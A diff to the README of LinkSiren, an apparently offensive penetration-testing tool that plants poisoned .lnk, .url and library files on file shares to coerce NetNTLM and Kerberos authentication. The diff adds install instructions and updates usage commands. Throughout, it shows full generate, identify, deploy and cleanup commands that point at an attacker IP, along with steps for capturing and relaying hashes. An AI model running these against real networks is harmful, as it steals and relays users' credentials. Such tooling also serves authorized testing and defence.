@@ -3,13 +3,41 @@ _The Siren waits thee, singing song for song._ - Walter Savage Landor
 
 LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to accessible file shares to coerce NetNTLM and Kerberos authentication over SMB and HTTP from hosts that open them. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for coercion and has scalable deployment and cleanup built in.
 
+# Installation
+Install using pip
+```
+# Optional: Create a virtual environment
+python -m pip install linksiren
+
+# Run with -h to output help info
+linksiren -h
+```
+
+Install from source
+```
+# Download source code
+git clone https://github.com/gjhami/LinkSiren.git
+cd LinkSiren
+
+# Optional: Set up a virtual environment and install requirements
+python -m venv .venv
+source ./.venv/bin/activate # Linux
+# .\.venv\Scripts\activate # Windows
+
+# Install requirements
+python -m pip install -r requirements.txt
+
+# Run with -h to output help info
+python ./src/linksiren/__main__.py -h
+```
+
 # Usage
 LinkSiren offers the following modes of operation:
 
 ## Generate
 Create poisoned files to use for coercion and store them locally.
 ```
-python .\link_siren.py generate --help
+linksiren generate --help
 usage: link_siren.py generate [-h] -a ATTACKER [-n PAYLOAD]
 
 optional arguments:
@@ -26,7 +54,7 @@ Required Arguments:
 ## Rank
 Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
 ```
-python .\link_siren.py rank --help
+linksiren rank --help
 usage: link_siren.py rank [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
 
 optional arguments:
@@ -53,7 +81,7 @@ Required Arguments:
 ## Identify
 Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
 ```
-python .\link_siren.py identify --help
+linksiren identify --help
 usage: link_siren.py identify [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
                               [-mf MAX_FOLDERS_PER_TARGET]
 
@@ -84,7 +112,7 @@ Required Arguments:
 ## Deploy
 Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.
 ```
-python .\link_siren.py deploy --help
+linksiren deploy --help
 usage: link_siren.py deploy [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
 
 optional arguments:
@@ -109,7 +137,7 @@ Required Arguments:
 ## Cleanup
 Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.
 ```
-python .\link_siren.py cleanup --help
+linksiren cleanup --help
 usage: link_siren.py cleanup [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
 
 optional arguments:
@@ -153,15 +181,15 @@ git clone https://github.com/gjhami/LinkSiren.git && cd LinkSiren
 python -m pip install -r requirements.txt
 
 # Identify optimal locations for poisoned file deployment
-python link_siren.py identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
+linksiren identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
 
 # Deploy to identified locations
-python link_siren.py deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
+linksiren deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
 
 # Capture hashes / relay authentication
 
 # Cleanup poisoned files
-python link_siren.py cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
+linksiren cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
 ```
 
 ## How do I use this the \~right\~ way?
@@ -182,11 +210,11 @@ python -m pip install -r requirements.txt
 # 2. Use LinkSiren to identify the most active folders on them
 #    Note: You may fine tune the --max-depth, --active-threshold, --fast, and --max-folders-per-share params as necessary
 #    Note: Specify '.' as the domain to log in using a local user account
-python link_siren.py identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
+linksiren identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
 
 # 3. Use LinkSiren to deploy payloads to all of the active folders
 #    --identify saves UNC paths to active folders in folder_targets.txt
-python link_siren.py deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
+linksiren deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
 
 # 4. Let the hashes come to you and relay them as you see fit :)
 #    Use CrackMapExec and LdapRelayScan for relay target identification
@@ -198,7 +226,7 @@ python link_siren.py deploy --username <username> --password <password> --domain
 #    Set targets to a file containing UNC paths of all folders where payloads were written
 #    --deploy saves UNC paths to deployed payloads in payload_folders.txt
 #    Note: If you set a custom payload name (--payload) when deploying, you must set the same name here
-python link_siren.py cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
+linksiren cleanup --username <username> --password <password> --domain <domain.tld> --targets payloads_written.txt
 ```
 
 ## How is this better than the other tools?
